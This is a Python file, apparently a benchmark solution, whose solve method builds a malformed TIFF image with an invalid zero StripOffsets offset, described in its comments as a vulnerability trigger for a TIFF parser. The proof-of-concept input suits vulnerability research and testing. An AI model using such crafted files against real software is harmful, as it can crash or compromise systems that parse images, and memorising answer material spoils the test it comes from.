import struct
from typing import List, Tuple

class Solution:
    def solve(self, src_path: str) -> bytes:
        le = "<"

        TYPE_BYTE = 1
        TYPE_ASCII = 2
        TYPE_SHORT = 3
        TYPE_LONG = 4

        def ifd_entry(tag: int, typ: int, count: int, value_or_offset: int) -> bytes:
            return struct.pack(le + "HHII", tag, typ, count, value_or_offset)

        # TIFF header
        # Little-endian: "II", magic 42, first IFD at offset 8
        header = b"II" + struct.pack(le + "H", 42) + struct.pack(le + "I", 8)

        # Build a small, mostly-valid baseline TIFF with 3 strips of 1 byte each.
        # The vulnerability trigger: StripOffsets is an offline tag (count=3 LONG => 12 bytes)
        # with value offset set to zero.
        #
        # Image: 1x3 grayscale, uncompressed, rows per strip = 1 => 3 strips
        entries: List[bytes] = []
        entries.append(ifd_entry(256, TYPE_LONG, 1, 1))     # ImageWidth = 1
        entries.append(ifd_entry(257, TYPE_LONG, 1, 3))     # ImageLength = 3
        entries.append(ifd_entry(258, TYPE_SHORT, 1, 8))    # BitsPerSample = 8 (inlined)
        entries.append(ifd_entry(259, TYPE_SHORT, 1, 1))    # Compression = 1 (none)
        entries.append(ifd_entry(262, TYPE_SHORT, 1, 1))    # Photometric = 1 (BlackIsZero)
        entries.append(ifd_entry(273, TYPE_LONG, 3, 0))     # StripOffsets (offline) -> INVALID offset 0
        entries.append(ifd_entry(277, TYPE_SHORT, 1, 1))    # SamplesPerPixel = 1
        entries.append(ifd_entry(278, TYPE_LONG, 1, 1))     # RowsPerStrip = 1

        n_entries = len(entries) + 2  # StripByteCounts + PlanarConfiguration
        ifd_size = 2 + n_entries * 12 + 4
        stripbytecounts_offset = 8 + ifd_size
        pixel_data_offset = stripbytecounts_offset + 12

        entries.append(ifd_entry(279, TYPE_LONG, 3, stripbytecounts_offset))  # StripByteCounts (offline)
        entries.append(ifd_entry(284, TYPE_SHORT, 1, 1))    # PlanarConfiguration = 1 (contig)

        # Ensure entries are sorted by tag (good hygiene)
        def entry_tag(e: bytes) -> int:
            return struct.unpack(le + "H", e[:2])[0]
        entries.sort(key=entry_tag)

        ifd = struct.pack(le + "H", len(entries)) + b"".join(entries) + struct.pack(le + "I", 0)

        stripbytecounts = struct.pack(le + "III", 1, 1, 1)
        pixel_data = b"\x00\x00\x00"

        data = header + ifd + stripbytecounts + pixel_data

        # Pad to keep offsets valid and avoid accidental truncation behaviors
        if len(data) < pixel_data_offset + 3:
            data += b"\x00" * (pixel_data_offset + 3 - len(data))

        return data